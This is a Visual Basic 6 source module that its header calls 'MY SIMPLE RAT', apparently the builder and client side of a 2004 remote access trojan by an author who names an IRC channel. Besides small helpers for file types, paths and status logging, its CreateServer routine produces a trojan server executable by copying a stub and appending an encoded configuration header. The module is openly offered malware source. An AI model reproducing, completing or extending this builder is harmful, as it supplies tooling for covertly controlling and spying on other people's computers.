Attribute VB_Name = "MainModule"
'#########################################'
'#########################################'
'##                                     ##'
'##          MY SIMPLE RAT :)           ##'
'##                                     ##'
'##             28.11.2004              ##'
'##                                     ##'
'##   ~ RIPPING SUCKX ~                 ##'
'##                                     ##'
'##       -> SNIPER109 <-               ##'
'##                                     ##'
'## irc.quakenet.org @ #sniper109       ##'
'#########################################'
'#########################################'

Type Clt
    Servername  As String
    RemIP       As String
    Connected   As Boolean
    Index       As Integer
    Chatname    As String
End Type
Public Server As Clt
Public Function ByteToKB(ByVal tBytes As Long) As String
    On Error GoTo ende
    Dim tmp As Variant
    tmp = Split(Format(tBytes / 1024, "#"), ",")
    ByteToKB = tmp(0)
    Exit Function
ende:
    ByteToKB = "< 1"
End Function
Public Function PathBack(ByVal sPath As String) As String
    On Error Resume Next
    Dim sT As Variant
    Dim tt As String
    If Len(sPath) = 3 Then GoTo errorhand
    
    sT = Split(Replace(sPath, "/", "\"), "\")
    
    For ii = 0 To UBound(sT) - 2
        tt = tt & sT(ii) & "\"
    Next ii
    
    PathBack = tt
    Exit Function
errorhand:
    PathBack = sPath
End Function
Public Function FileMime(ByVal tFile As String) As Long
    On Error Resume Next
    Select Case Right(LCase(tFile), 4)
        Case ".avi", ".mpg", ".wmv", "mpeg", ".mp3", ".wma", "midi", ".wav": FileMime = 1
        Case ".bat", ".com", ".cmd": FileMime = 2
        Case ".dll", ".ocx", ".sys": FileMime = 3
        Case ".exe": FileMime = 4
        Case ".ini", ".inf": FileMime = 5
        Case ".txt": FileMime = 6
        Case ".zip", ".ace", ".cab", ".rar": FileMime = 9
        Case ".rtf", ".doc": FileMime = 7
        Case ".pdf": FileMime = 8
        Case ".bmp", ".gif", ".jpg", ".png": FileMime = 13
        Case Else: FileMime = 10
    End Select
End Function
Public Sub Status(ByVal tNewStatus As String, Optional tNewMode As String)
    On Error Resume Next
    If tNewStatus = "" Then Exit Sub
    frmMain.List(0).AddItem "[" & Time & "] " & tNewStatus
    frmMain.List(0).ListIndex = frmMain.List(0).ListCount - 1
    With frmMain.StatusBar1
        .Panels(2).Text = tNewStatus
        If tNewMode <> "" Then
            .Panels(1).Text = "- " & tNewMode & " -"
        End If
    End With
End Sub

Sub Main()
    StyleME
    LoadConfig
    frmMain.Show
    Status "Bereit...", "Idle"
End Sub
Sub LoadConfig()
    frmMain.Label(15) = "Aktuell: " & GetStyle("copyright", "name") & " von " & GetStyle("copyright", "autor")
End Sub
Public Sub CreateServer()
    Status "Erstelle Server....", "Wait"
    Dim temp As String
    temp = "[header]" & Encode(frmMain.Text(6).Text) & "[/header]"
    FileCopy App.Path & "\conv.dll", App.Path & "\server2.exe"
    Open App.Path & "\server2.exe" For Binary As #1
    Seek #1, LOF(1)
    Put #1, , temp
    Close #1
    Status "Server erfolgreich kompiliert!", "Idle"
    MsgBox App.Path & "\server2.exe wurde erfolgreich erstellt.", vbInformation
End Sub

